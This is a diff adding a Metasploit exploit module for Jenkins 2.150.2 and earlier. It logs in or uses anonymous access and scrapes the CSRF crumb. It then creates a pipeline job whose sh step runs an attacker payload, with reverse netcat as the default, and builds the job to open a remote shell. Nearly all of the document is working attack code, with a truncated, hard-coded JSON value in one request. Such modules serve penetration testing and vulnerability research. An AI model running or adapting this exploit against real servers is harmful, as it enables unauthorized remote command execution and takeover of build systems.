@@ -1,0 +1,182 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+ 
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GoodRanking
+
+  include Msf::Exploit::Remote::HttpClient
+ 
+    def initialize(info = {})
+        super(update_info(info,
+          'Name'           => 'Jenkins <= 2.150.2 Remote Command Execution via Node JS (Metasploit)',
+          'Description'    => %q{
+                  This module can run commands on the system using Jenkins users who has JOB creation and BUILD privileges.
+                  The vulnerability is exploited by a small script prepared in NodeJS.
+                  The sh parameter allows us to run commands.
+                  Sample script: 
+                                node {
+                                      sh "whoami"
+                                }
+                  In addition, ANONYMOUS users also have the authority to JOB create and BUILD by default.
+                  Therefore, all users without console authority can run commands on the system as root privilege.
+          },
+          'Author'         => [
+            'AkkuS <Özkan Mustafa Akkuş>', # Vulnerability Discovery, PoC & Msf Module
+          ],
+          'License'        => MSF_LICENSE,
+          'References'     =>
+            [
+              ['URL', 'https://pentest.com.tr/exploits/Jenkins-Remote-Command-Execution-via-Node-JS-Metasploit.html']
+            ],
+          'Privileged'     => true,
+          'Payload'        =>
+            {
+              'DisableNops' => true,
+              'Space'       => 512,
+              'Compat'      =>
+                {
+                  'PayloadType' => 'cmd',
+                  'RequiredCmd' => 'reverse netcat generic perl ruby python telnet',
+                }
+            },
+          'Platform'       => 'unix',
+          'Arch'           => ARCH_CMD,
+          'Targets'        => [[ 'Jenkins <= 2.150.2', { }]],
+          'DisclosureDate' => 'Feb 11 2019',
+          'DefaultTarget'  => 0,
+          'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_netcat' }))
+
+          register_options(
+            [
+                OptString.new('USERNAME', [ false, 'The username to authenticate as', '' ]),
+                OptString.new('PASSWORD', [ false, 'The password for the specified username', '' ]),
+                OptString.new('PATH', [ true, 'The path to jenkins', '/' ]),
+            ], self.class)
+    end
+##
+# Jenkins activity check
+##
+ 
+    def check
+        res = send_request_cgi({'uri' => "/login"})
+        if res and res.headers.include?('X-Jenkins')
+            return Exploit::CheckCode::Detected
+        else
+            return Exploit::CheckCode::Safe
+        end
+    end
+ 
+    def exploit
+        print_status('Attempting to login to Jenkins dashboard')
+        res = send_request_cgi({'uri' => "/script"})
+        if not (res and res.code)
+            fail_with(Exploit::Failure::Unknown)
+        end
+ 
+        sessionid = 'JSESSIONID' << res.get_cookies.split('JSESSIONID')[1].split('; ')[0]
+        @cookie = "#{sessionid}"
+	print_status("#{sessionid}")
+ 
+        if res.code != 200
+            print_status('Logging in...')
+##
+# Access control and information
+##
+            res = send_request_cgi({
+                'method'    => 'POST',
+                'uri'       => "/j_acegi_security_check",
+                'cookie'    => @cookie,
+                'vars_post' =>
+                    {
+                        'j_username' => Rex::Text.uri_encode(datastore['USERNAME'], 'hex-normal'),
+                        'j_password' => Rex::Text.uri_encode(datastore['PASSWORD'], 'hex-normal'),
+                        'Submit'     => 'Sign+in'
+                    }
+            })
+
+            if not (res and res.code == 302) or res.headers['Location'] =~ /loginError/
+                print_error('User Login failed. If anonymous login is active, exploit will continue.')
+            end
+        else
+            print_status('No authentication required, skipping login...')
+        end
+##
+# Check Crumb for create pipeline
+##
+	cookies = res.get_cookies
+        res = send_request_cgi({
+	    'method' => 'GET',
+            'uri' => "/view/all/newJob",
+            'cookie'  => cookies
+        })
+
+        html = res.body
+        if html =~ /Jenkins-Crumb/
+          print_good("Login Successful")
+        else
+          print_status("Service found, but login failed")
+          exit 0
+        end
+
+	crumb = res.body.split('Jenkins-Crumb')[1].split('");<')[0].split('"').last
+        print_status("Jenkins-Crumb: #{crumb}")
+##
+# Create Pipeline
+##
+        res = send_request_cgi({
+	    'method' => 'POST',
+            'uri' => "/view/all/createItem",
+            'cookie'  => cookies,
+            'vars_post' =>
+                {
+                    'name' => "cmd",
+                    'mode' => "org.jenkinsci.plugins.workflow.job.WorkflowJob",
+                    'from' => "",
+                    'Jenkins-Crumb' => "#{crumb}",
+                    'json' => "%7B%22name%22%3A+%22cmd%22%2C+%22mode%22%3A+%22org.jenkinsci.plugins.workflow.job.WorkflowJob%22%2C+%22from%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%22528f90f71b2d2742299b4daf503130ac%22%7"
+                }
+        })
+
+##
+# Configure Pipeline
+##
+        shell = payload.encoded
+        res = send_request_cgi({
+	    'method' => 'POST',
+            'uri' => "/job/cmd/configSubmit",
+            'cookie'  => cookies,
+            'vars_post' =>
+                {
+                    'description' => "cmd",
+                    'Jenkins-Crumb' => "#{crumb}",
+                    'json' => "{\"description\": \"cmd\", \"properties\": {\"stapler-class-bag\": \"true\", \"hudson-security-AuthorizationMatrixProperty\": {}, \"jenkins-model-BuildDiscarderProperty\": {\"specified\": false, \"\": \"0\", \"strategy\": {\"daysToKeepStr\": \"\", \"numToKeepStr\": \"\", \"artifactDaysToKeepStr\": \"\", \"artifactNumToKeepStr\": \"\", \"stapler-class\": \"hudson.tasks.LogRotator\", \"$class\": \"hudson.tasks.LogRotator\"}}, \"org-jenkinsci-plugins-workflow-job-properties-DisableConcurrentBuildsJobProperty\": {\"specified\": false}, \"org-jenkinsci-plugins-workflow-job-properties-DisableResumeJobProperty\": {\"specified\": false}, \"com-coravy-hudson-plugins-github-GithubProjectProperty\": {}, \"org-jenkinsci-plugins-workflow-job-properties-DurabilityHintJobProperty\": {\"specified\": false, \"hint\": \"MAX_SURVIVABILITY\"}, \"org-jenkinsci-plugins-pipeline-modeldefinition-properties-PreserveStashesJobProperty\": {\"specified\": false, \"buildCount\": \"1\"}, \"hudson-model-ParametersDefinitionProperty\": {\"specified\": false}, \"jenkins-branch-RateLimitBranchProperty$JobPropertyImpl\": {}, \"org-jenkinsci-plugins-workflow-job-properties-PipelineTriggersJobProperty\": {\"triggers\": {\"stapler-class-bag\": \"true\"}}}, \"disable\": false, \"hasCustomQuietPeriod\": false, \"quiet_period\": \"5\", \"displayNameOrNull\": \"\", \"\": \"0\", \"definition\": {\"script\": \"node {\\n    sh \\\"#{shell}\\\"\\n}\", \"\": [\"try sample Pipeline...\", \"\\u0001\\u0001\"], \"sandbox\": true, \"stapler-class\": \"org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition\", \"$class\": \"org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition\"}, \"core:apply\": \"\", \"Jenkins-Crumb\": \"#{crumb}\"}",
+                    'Submit' => "Save"
+                }
+        })
+
+        if res.code == 302
+          print_good("Pipeline was created and Node JS code was integrated.")
+        end
+##
+# Build Pipeline and Execute payload
+##
+        print_status("Trying to get remote shell...")
+        res = send_request_cgi({
+	    'method' => 'POST',
+            'uri' => "/job/cmd/build?delay=0sec",
+            'cookie'  => cookies,
+            'vars_post' =>
+                {
+                    'Jenkins-Crumb' => "#{crumb}"
+                }
+        })
+    handler
+    end
+end
+##
+# End
+##
